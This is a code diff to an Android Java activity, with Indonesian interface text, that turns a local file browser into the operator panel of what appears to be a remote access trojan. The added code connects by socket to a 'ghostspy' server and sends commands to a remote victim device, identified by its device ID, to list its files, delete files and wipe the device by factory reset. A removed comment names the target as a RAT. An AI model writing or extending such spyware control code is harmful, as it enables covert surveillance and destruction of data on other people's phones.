@@ -3,10 +3,13 @@ package com.testapp;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.os.Bundle;
-import android.os.Environment;
-import android.os.StatFs;
 import android.view.Gravity;
 import android.widget.*;
+import io.socket.client.IO;
+import io.socket.client.Socket;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.net.URISyntaxException;
 import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -16,10 +19,13 @@ public class FileManagerActivity extends Activity {
     private LinearLayout fileContainer;
     private String currentPath = "/sdcard";
     private TextView pathText;
+    private Socket socket;
+    private String deviceId;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        deviceId = getIntent().getStringExtra("deviceId");
 
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
@@ -54,12 +60,11 @@ public class FileManagerActivity extends Activity {
         refreshBtn.setText("🔄");
         refreshBtn.setTextColor(0xFFFFFFFF);
         refreshBtn.setBackgroundColor(0x00000000);
-        refreshBtn.setOnClickListener(v -> navigateTo(currentPath));
+        refreshBtn.setOnClickListener(v -> requestFiles(currentPath));
         header.addView(refreshBtn);
-
         root.addView(header);
 
-        // Breadcrumb & Path
+        // Path & Up
         LinearLayout breadcrumbBar = new LinearLayout(this);
         breadcrumbBar.setOrientation(LinearLayout.HORIZONTAL);
         breadcrumbBar.setPadding(16, 8, 16, 8);
@@ -74,59 +79,17 @@ public class FileManagerActivity extends Activity {
         upBtn.setText("⬆");
         upBtn.setTextColor(0xFFFFFFFF);
         upBtn.setBackgroundColor(0x00000000);
-        upBtn.setOnClickListener(v -> navigateUp());
+        upBtn.setOnClickListener(v -> {
+            if (!currentPath.equals("/")) {
+                File parent = new File(currentPath).getParentFile();
+                if (parent != null) {
+                    currentPath = parent.getAbsolutePath();
+                    requestFiles(currentPath);
+                }
+            }
+        });
         breadcrumbBar.addView(upBtn);
-
         root.addView(breadcrumbBar);
-
-        // Ringkasan Penyimpanan
-        LinearLayout storageCard = new LinearLayout(this);
-        storageCard.setOrientation(LinearLayout.VERTICAL);
-        storageCard.setBackground(getDrawable(R.drawable.card_admin));
-        storageCard.setPadding(16, 16, 16, 16);
-        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        cardParams.setMargins(16, 8, 16, 8);
-        storageCard.setLayoutParams(cardParams);
-
-        // Progress bar melingkar (dummy)
-        ProgressBar circle = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
-        circle.setMax(100);
-        circle.setProgress(62); // contoh
-        circle.setBackgroundColor(0xFF00E676);
-        LinearLayout.LayoutParams circleParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT, 12);
-        circleParams.setMargins(0, 0, 0, 8);
-        circle.setLayoutParams(circleParams);
-        storageCard.addView(circle);
-
-        TextView storageInfo = new TextView(this);
-        storageInfo.setText("Total: 128 GB | Terpakai: 79 GB | Tersedia: 49 GB");
-        storageInfo.setTextColor(0xFFFFFFFF);
-        storageInfo.setTextSize(14);
-        storageCard.addView(storageInfo);
-        root.addView(storageCard);
-
-        // Kategori (dummy grid)
-        LinearLayout categoryGrid = new LinearLayout(this);
-        categoryGrid.setOrientation(LinearLayout.HORIZONTAL);
-        categoryGrid.setPadding(16, 4, 16, 8);
-
-        String[] cats = {"Images", "Videos", "Audio", "Docs"};
-        for (String cat : cats) {
-            TextView catView = new TextView(this);
-            catView.setText(cat);
-            catView.setTextColor(0xFFFFFFFF);
-            catView.setBackgroundColor(0xFF171717);
-            catView.setPadding(16, 12, 16, 12);
-            catView.setGravity(Gravity.CENTER);
-            LinearLayout.LayoutParams catParams = new LinearLayout.LayoutParams(
-                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-            catParams.setMargins(4, 0, 4, 0);
-            catView.setLayoutParams(catParams);
-            categoryGrid.addView(catView);
-        }
-        root.addView(categoryGrid);
 
         // Daftar file
         ScrollView scroll = new ScrollView(this);
@@ -148,112 +111,121 @@ public class FileManagerActivity extends Activity {
         resetBtn.setLayoutParams(resetParams);
         root.addView(resetBtn);
 
-        // Muat isi folder
-        navigateTo(currentPath);
+        // Socket
+        try {
+            socket = IO.socket("https://ghostspy.bruang.biz.id");
+            socket.connect();
+        } catch (URISyntaxException e) {}
+
+        socket.on("files", args -> {
+            try {
+                String filesStr = args[0].toString();
+                JSONArray files = new JSONArray(filesStr);
+                runOnUiThread(() -> displayFiles(files));
+            } catch (Exception e) {}
+        });
+
+        requestFiles(currentPath);
     }
 
-    private void navigateTo(String path) {
+    private void requestFiles(String path) {
         currentPath = path;
         pathText.setText(path);
-
-        File dir = new File(path);
-        if (!dir.exists() || !dir.isDirectory()) {
-            Toast.makeText(this, "Folder tidak ditemukan", Toast.LENGTH_SHORT).show();
-            return;
+        if (socket != null && socket.connected()) {
+            JSONObject msg = new JSONObject();
+            try {
+                msg.put("device_id", deviceId);
+                msg.put("command", "list_files");
+                msg.put("params", new JSONObject().put("path", path));
+                socket.emit("command", msg);
+            } catch (Exception e) {}
         }
+    }
 
-        File[] files = dir.listFiles();
+    private void displayFiles(JSONArray files) {
         fileContainer.removeAllViews();
-
-        if (files == null || files.length == 0) {
-            TextView empty = new TextView(this);
-            empty.setText("Folder kosong");
-            empty.setTextColor(0xFF9AA3B2);
-            empty.setGravity(Gravity.CENTER);
-            empty.setPadding(0, 32, 0, 32);
-            fileContainer.addView(empty);
-            return;
-        }
-
         SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+        try {
+            for (int i = 0; i < files.length(); i++) {
+                JSONObject f = files.getJSONObject(i);
+                boolean isDir = f.optBoolean("dir", false);
+                String name = f.optString("name", "");
+                long size = f.optLong("size", 0);
+                String path = f.optString("path", "");
 
-        for (File f : files) {
-            LinearLayout item = new LinearLayout(this);
-            item.setOrientation(LinearLayout.HORIZONTAL);
-            item.setGravity(Gravity.CENTER_VERTICAL);
-            item.setBackground(getDrawable(R.drawable.card_admin));
-            item.setPadding(16, 12, 16, 12);
-            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
-                    LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-            lp.setMargins(0, 0, 0, 6);
-            item.setLayoutParams(lp);
+                LinearLayout item = new LinearLayout(this);
+                item.setOrientation(LinearLayout.HORIZONTAL);
+                item.setGravity(Gravity.CENTER_VERTICAL);
+                item.setBackground(getDrawable(R.drawable.card_admin));
+                item.setPadding(16, 12, 16, 12);
+                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                        LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+                lp.setMargins(0, 0, 0, 6);
+                item.setLayoutParams(lp);
 
-            // Ikon
-            TextView icon = new TextView(this);
-            icon.setText(f.isDirectory() ? "📁" : "📄");
-            icon.setTextSize(24);
-            icon.setPadding(0, 0, 12, 0);
-            item.addView(icon);
+                TextView icon = new TextView(this);
+                icon.setText(isDir ? "📁" : "📄");
+                icon.setTextSize(24);
+                icon.setPadding(0, 0, 12, 0);
+                item.addView(icon);
 
-            // Info
-            LinearLayout infoCol = new LinearLayout(this);
-            infoCol.setOrientation(LinearLayout.VERTICAL);
-            LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
-                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-            infoCol.setLayoutParams(infoParams);
+                LinearLayout infoCol = new LinearLayout(this);
+                infoCol.setOrientation(LinearLayout.VERTICAL);
+                LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
+                        0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+                infoCol.setLayoutParams(infoParams);
 
-            TextView nameView = new TextView(this);
-            nameView.setText(f.getName());
-            nameView.setTextColor(0xFFFFFFFF);
-            nameView.setTextSize(14);
-            infoCol.addView(nameView);
+                TextView nameView = new TextView(this);
+                nameView.setText(name);
+                nameView.setTextColor(0xFFFFFFFF);
+                nameView.setTextSize(14);
+                infoCol.addView(nameView);
 
-            TextView detailView = new TextView(this);
-            String detail = (f.isDirectory() ? "Folder" : f.length() + " bytes") + " | " + sdf.format(new Date(f.lastModified()));
-            detailView.setText(detail);
-            detailView.setTextColor(0xFF9AA3B2);
-            detailView.setTextSize(11);
-            infoCol.addView(detailView);
+                TextView detailView = new TextView(this);
+                String detail = (isDir ? "Folder" : size + " bytes");
+                detailView.setText(detail);
+                detailView.setTextColor(0xFF9AA3B2);
+                detailView.setTextSize(11);
+                infoCol.addView(detailView);
 
-            item.addView(infoCol);
+                item.addView(infoCol);
 
-            // Menu 3 titik
-            Button menuBtn = new Button(this);
-            menuBtn.setText("⋮");
-            menuBtn.setTextColor(0xFFFFFFFF);
-            menuBtn.setBackgroundColor(0x00000000);
-            menuBtn.setOnClickListener(v -> showFileOptions(f));
-            item.addView(menuBtn);
+                Button menuBtn = new Button(this);
+                menuBtn.setText("⋮");
+                menuBtn.setTextColor(0xFFFFFFFF);
+                menuBtn.setBackgroundColor(0x00000000);
+                menuBtn.setOnClickListener(v -> showFileOptions(name, path, isDir));
+                item.addView(menuBtn);
 
-            // Klik folder untuk masuk
-            if (f.isDirectory()) {
-                item.setOnClickListener(v -> navigateTo(f.getAbsolutePath()));
+                if (isDir) {
+                    item.setOnClickListener(v -> requestFiles(path));
+                }
+
+                fileContainer.addView(item);
             }
-
-            fileContainer.addView(item);
-        }
+        } catch (Exception e) {}
     }
 
-    private void navigateUp() {
-        File parent = new File(currentPath).getParentFile();
-        if (parent != null) {
-            navigateTo(parent.getAbsolutePath());
-        }
-    }
-
-    private void showFileOptions(File file) {
+    private void showFileOptions(String name, String path, boolean isDir) {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle(file.getName());
-        String[] options = {"Hapus", "Info"};
-        b.setItems(options, (d, which) -> {
-            if (which == 0) {
-                boolean deleted = file.delete();
-                Toast.makeText(this, deleted ? "Terhapus" : "Gagal", Toast.LENGTH_SHORT).show();
-                navigateTo(currentPath);
-            } else {
-                Toast.makeText(this, "Nama: " + file.getName() + "\nUkuran: " + file.length(), Toast.LENGTH_LONG).show();
-            }
-        });
+        b.setTitle(name);
+        if (!isDir) {
+            b.setItems(new String[]{"Hapus"}, (d, which) -> {
+                if (socket != null && socket.connected()) {
+                    JSONObject msg = new JSONObject();
+                    try {
+                        msg.put("device_id", deviceId);
+                        msg.put("command", "delete_file");
+                        msg.put("params", new JSONObject().put("path", path));
+                        socket.emit("command", msg);
+                        Toast.makeText(this, "Perintah hapus dikirim", Toast.LENGTH_SHORT).show();
+                    } catch (Exception e) {}
+                }
+            });
+        } else {
+            b.setMessage("Folder");
+        }
+        b.setNegativeButton("Tutup", null);
         b.show();
     }
 
@@ -262,11 +234,16 @@ public class FileManagerActivity extends Activity {
         b.setTitle("Reset Pabrik");
         b.setMessage("Semua data akan dihapus. Lanjutkan?");
         b.setPositiveButton("Ya", (d, w) -> {
-            // Kirim perintah wipe ke perangkat (jika ada socket)
-            // Atau langsung eksekusi
-            Toast.makeText(this, "Reset pabrik done", Toast.LENGTH_LONG).show();
-            // Contoh: mengirim perintah ke RAT melalui socket jika terhubung
-            // Jika tidak ada socket, kita abaikan
+            if (socket != null && socket.connected()) {
+                JSONObject msg = new JSONObject();
+                try {
+                    msg.put("device_id", deviceId);
+                    msg.put("command", "wipe");
+                    msg.put("params", new JSONObject());
+                    socket.emit("command", msg);
+                    Toast.makeText(this, "Reset pabrik dikirim", Toast.LENGTH_LONG).show();
+                } catch (Exception e) {}
+            }
         });
         b.setNegativeButton("Batal", null);
         b.show();
